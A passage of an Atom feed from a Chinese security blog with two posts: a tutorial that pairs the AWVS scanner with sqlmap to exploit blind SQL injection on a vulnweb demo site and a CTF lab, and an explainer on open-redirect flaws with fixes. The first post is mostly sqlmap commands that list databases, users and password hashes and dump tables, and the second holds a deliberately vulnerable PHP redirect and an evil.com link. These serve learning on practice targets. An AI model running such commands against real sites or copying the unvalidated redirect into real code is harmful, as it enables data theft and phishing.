      <category term="渗透" scheme="http://austfish.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>漏扫工具AWVS配合sqlmap注入点测试</title>
    <link href="http://austfish.cn/2017/04/09/%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7AWVS%E9%85%8D%E5%90%88sqlmap%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95/"/>
    <id>http://austfish.cn/2017/04/09/漏扫工具AWVS配合sqlmap注入点测试/</id>
    <published>2017-04-09T01:29:49.000Z</published>
    <updated>2022-02-18T03:34:22.393Z</updated>
    
    <content type="html"><![CDATA[<p>AWVS扫描：<a href="http://testaspnet.vulnweb.com" target="_blank" rel="noopener">http://testaspnet.vulnweb.com</a><br><a id="more"></a></p><h2 id="AWVS扫描：http-testaspnet-vulnweb-com（网易微专业提供）"><a href="#AWVS扫描：http-testaspnet-vulnweb-com（网易微专业提供）" class="headerlink" title="AWVS扫描：http://testaspnet.vulnweb.com（网易微专业提供）"></a>AWVS扫描：<a href="http://testaspnet.vulnweb.com（网易微专业提供）" target="_blank" rel="noopener">http://testaspnet.vulnweb.com（网易微专业提供）</a></h2><h3 id="右键Blind-SQL-injection"><a href="#右键Blind-SQL-injection" class="headerlink" title="右键Blind SQL injection"></a>右键Blind SQL injection</h3><p><code>GET /comments.aspx?id=3/**/AND/**/298%3d298 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://testaspnet.vulnweb.com:80/Cookie: ASP.NET_SessionId=4i4fby55wzfjfpzuwbv5jh45Host: testaspnet.vulnweb.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*</code></p><h6 id="直接复制包的内容放到sqlmap目录下"><a href="#直接复制包的内容放到sqlmap目录下" class="headerlink" title="直接复制包的内容放到sqlmap目录下"></a>直接复制包的内容放到sqlmap目录下</h6><h6 id="去掉-AND-298-3d298"><a href="#去掉-AND-298-3d298" class="headerlink" title="去掉//AND//298%3d298"></a>去掉/<strong>/AND/</strong>/298%3d298</h6><h6 id="保存为1-txt"><a href="#保存为1-txt" class="headerlink" title="保存为1.txt"></a>保存为1.txt</h6><h6 id="然后Python-sqlmap-py-r-1-txt"><a href="#然后Python-sqlmap-py-r-1-txt" class="headerlink" title="然后Python sqlmap.py -r 1.txt"></a>然后Python sqlmap.py -r 1.txt</h6><h2 id="awvs扫描点"><a href="#awvs扫描点" class="headerlink" title="awvs扫描点"></a>awvs扫描点</h2><p><code>python sqlmap.py -u “http://testaspnet.vulnweb.com/comments.aspx?id=3/**/AND/**/298%3d298” –dbs</code></p><p><strong>接下来介绍sql map的基本应用</strong></p><p><code>C:\Python27\sqlmap&gt;python sqlmap.py -u “http://testaspnet.vulnweb.com/comments.aspx?id=3/**/AND/**/298%3d298”</code></p><p><strong>检测注入点是否可用</strong></p><p><code>C:\Python27\sqlmap&gt;python sqlmap.py -u “http://testaspnet.vulnweb.com/comments.aspx?id=3/**/AND/**/298%3d298” –dbs</code></p><p><strong>暴库 一条命令即可曝出该sqlserver中所有数据库名称</strong></p><p><code>C:\Python27\sqlmap&gt;python sqlmap.py -u “http://testaspnet.vulnweb.com/comments.aspx?id=3/**/AND/**/298%3d298” –current-db</code></p><p><strong>web当前使用的数据库</strong></p><p><code>C:\Python27\sqlmap&gt;python sqlmap.py -u “http://testaspnet.vulnweb.com/comments.aspx?id=3/**/AND/**/298%3d298” –current-user</code></p><p><strong>web数据库使用账户</strong></p><p><code>C:\Python27\sqlmap&gt;python sqlmap.py -u “http://testaspnet.vulnweb.com/comments.aspx?id=3/**/AND/**/298%3d298” –users</code></p><p><strong>列出sqlserver所有用户</strong></p><p><code>C:\Python27\sqlmap&gt;python sqlmap.py -u “http://testaspnet.vulnweb.com/comments.aspx?id=3/**/AND/**/298%3d298” –passwords</code></p><p><strong>数据库账户与密码</strong></p><p><code>C:\Python27\sqlmap&gt;python sqlmap.py -u “http://testaspnet.vulnweb.com/comments.aspx?id=3/**/AND/**/298%3d298” -D tourdata –tables</code></p><p><strong>列出数据库中的表</strong></p><p><code>C:\Python27\sqlmap&gt;python sqlmap.py -u “http://testaspnet.vulnweb.com/comments.aspx?id=3/**/AND/**/298%3d298” -D acublog -T userb –columns</code></p><p><strong>列出表中字段</strong></p><p><code>C:\Python27\sqlmap&gt;python sqlmap.py -u “http://testaspnet.vulnweb.com/comments.aspx?id=3/**/AND/**/298%3d298” -D tourdata -T userb -C “email,Username,userpassword” –dump</code></p><p><strong>暴字段内容</strong></p><h2 id="实验吧"><a href="#实验吧" class="headerlink" title="实验吧"></a>实验吧</h2><p><strong>测试</strong><br><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=3" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=3</a><br><strong>注入点</strong></p><p><code>sqlmap.py -u “http://ctf5.shiyanbar.com/web/index_3.php?id=3”</code><br><strong>检测出</strong></p><p><code>sqlmap.py -u “http://ctf5.shiyanbar.com/web/index_3.php?id=3” –current-db</code><br><strong>爆出当前数据库web1</strong></p><p><code>sqlmap.py -u “http://ctf5.shiyanbar.com/web/index_3.php?id=3” –dbs</code><br><strong>爆出所有数据库  information_schema   web1</strong></p><p><code>sqlmap.py -u “http://ctf5.shiyanbar.com/web/index_3.php?id=3” –users</code><br><strong>爆出用户名  ‘web1’@’localhost’</strong></p><p><code>sqlmap.py -u “http://ctf5.shiyanbar.com/web/index_3.php?id=3” -D web1 –tables</code><br><strong>flag     web_1</strong></p><p><code>sqlmap.py -u “http://ctf5.shiyanbar.com/web/index_3.php?id=3” -D web1 -T flag –columns</code><br><strong>列出字段</strong></p><p><code>sqlmap.py -u “http://ctf5.shiyanbar.com/web/index_3.php?id=3″ -D web1 -T flag -C”flag” –dump</code><br><strong>爆出字段名</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AWVS扫描：&lt;a href=&quot;http://testaspnet.vulnweb.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://testaspnet.vulnweb.com&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="web" scheme="http://austfish.cn/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>URL重定向/跳转漏洞解释说明及修复方案</title>
    <link href="http://austfish.cn/2017/03/20/URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%87%8A%E8%AF%B4%E6%98%8E%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/"/>
    <id>http://austfish.cn/2017/03/20/URL重定向-跳转漏洞解释说明及修复方案/</id>
    <published>2017-03-20T01:29:49.000Z</published>
    <updated>2022-02-18T03:34:21.248Z</updated>
    
    <content type="html"><![CDATA[<p>由于应用越来越多的需要和其他的第三方应用交互，以及在自身应用内部根据不同的逻辑将用户引向到不同的页面，譬如一个典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致一些安全问题，特定条件下可能引起严重的安全漏洞。<br><a id="more"></a></p><h2 id="0x00-相关背景介绍"><a href="#0x00-相关背景介绍" class="headerlink" title="0x00 相关背景介绍"></a>0x00 相关背景介绍</h2><p>由于应用越来越多的需要和其他的第三方应用交互，以及在自身应用内部根据不同的逻辑将用户引向到不同的页面，譬如一个典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致一些安全问题，特定条件下可能引起严重的安全漏洞。</p><h2 id="0x01-成因"><a href="#0x01-成因" class="headerlink" title="0x01 成因"></a>0x01 成因</h2><p>对于URL跳转的实现一般会有几种实现方式：</p><p><strong>META标签内跳转<br>javascript跳转<br>header头跳转</strong></p><p>通过以GET或者POST的方式接收将要跳转的URL，然后通过上面的几种方式的其中一种来跳转到目标URL。一方面，由于用户的输入会进入 Meta，javascript，http头所以都可能发生相应上下文的漏洞，如xss等等，但是同时，即使只是对于URL跳转本身功能方面就存在一个缺 陷，因为会将用户浏览器从可信的站点导向到不可信的站点，同时如果跳转的时候带有敏感数据一样可能将敏感数据泄漏给不可信的第三方。</p><p>譬如一个典型的登录跳转如下：</p><p><code>&lt;?php  $url=$_GET[‘jumpto’];  header(“Location: $url”);  ?&gt;</code><br>如果jumpto没有任何限制，所以恶意用户可以提交</p><p><code>http://www.xxx.net/login.php?jumpto=http://www.evil.com</code><br>来生成自己的恶意链接，安全意识较低的用户很可能会以为该链接展现的内容是<strong><a href="http://www.wooyun.org" target="_blank" rel="noopener">www.wooyun.org</a></strong>从而可能产生欺诈行为，同时由于QQ，淘宝 旺旺等在线IM都是基于URL的过滤，同时对一些站点会一白名单的方式放过，所以导致恶意URL在IM里可以传播，从而产生危害，譬如这里IM会认为 <strong><a href="http://www.2cto.com" target="_blank" rel="noopener">www.2cto.com</a></strong> 都是可信的，但是通过在IM里点击上述链接将导致用户最终访问evil.com。</p><h2 id="0x02-攻击方式及危害"><a href="#0x02-攻击方式及危害" class="headerlink" title="0x02 攻击方式及危害"></a>0x02 攻击方式及危害</h2><p>恶意用户完全可以借用URL跳转漏洞来欺骗安全意识低的用户，从而导致“中奖”之类的欺诈，这对于一些有在线业务的企业如淘宝等，危害较大，同时借 助URL跳转，也可以突破常见的基于“白名单方式”的一些安全限制，如传统IM里对于URL的传播会进行安全校验，但是对于大公司的域名及URL将直接允 许通过并且显示会可信的URL，而一旦该URL里包含一些跳转漏洞将可能导致安全限制被绕过。</p><p>如果引用一些资源的限制是依赖于“白名单方式”，同样可能被绕过导致安全风险，譬如常见的一些应用允许引入可信站点如youku.com的视频，限 制方式往往是检查URL是否是youku.com来实现，如果youku.com内含一个url跳转漏洞，将导致最终引入的资源属于不可信的第三方资源或 者恶意站点，最终导致安全问题。</p><h2 id="0x03-实际案例"><a href="#0x03-实际案例" class="headerlink" title="0x03 实际案例"></a>0x03 实际案例</h2><h3 id="a-WooYun-百度一个URL跳转漏洞"><a href="#a-WooYun-百度一个URL跳转漏洞" class="headerlink" title="a WooYun: 百度一个URL跳转漏洞"></a>a WooYun: 百度一个URL跳转漏洞</h3><p>通过url跳转突破IM的安全校验，从而传播恶意URL</p><h3 id="b-WooYun-第五次遇到利用淘宝网网址跳转的网钓"><a href="#b-WooYun-第五次遇到利用淘宝网网址跳转的网钓" class="headerlink" title="b WooYun: 第五次遇到利用淘宝网网址跳转的网钓"></a>b WooYun: 第五次遇到利用淘宝网网址跳转的网钓</h3><p>通过url跳转欺骗交易用户对URL的信任，从而实现欺诈</p><p>通过URL跳转绕过应用程序对引用资源的限制，从而导致安全漏洞</p><h3 id="d-WooYun-豆瓣电台认证绕过及csrf防范策略绕过漏洞"><a href="#d-WooYun-豆瓣电台认证绕过及csrf防范策略绕过漏洞" class="headerlink" title="d WooYun: 豆瓣电台认证绕过及csrf防范策略绕过漏洞"></a>d WooYun: 豆瓣电台认证绕过及csrf防范策略绕过漏洞</h3><p>借助未验证的URL跳转，可以将应用程序内部敏感的数据传递到不安全的第三方区域</p><h2 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h2><p>理论上讲，url跳转属于CSRF的一种，我们需要对传入的URL做有效性的认证，保证该URL来自于正确的地方，限制的方式同防止csrf一样可以包括：</p><h3 id="1-referer的限制"><a href="#1-referer的限制" class="headerlink" title="1 referer的限制"></a>1 referer的限制</h3><p>###<br>如果确定传递URL参数进入的来源，我们可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接</p><p>### </p><h3 id="2-加入有效性验证Token"><a href="#2-加入有效性验证Token" class="headerlink" title="2 加入有效性验证Token"></a>2 加入有效性验证Token</h3><p>我们保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，但是如果功能本身要求比较开放，可能导致有一定的限制。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于应用越来越多的需要和其他的第三方应用交互，以及在自身应用内部根据不同的逻辑将用户引向到不同的页面，譬如一个典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致一些安全问题，特定条件下可能引起严重的安全漏洞。&lt;br&gt;
    
    </summary>
    
    
      <category term="web" scheme="http://austfish.cn/tags/web/"/>
    
  </entry>
  
</feed>
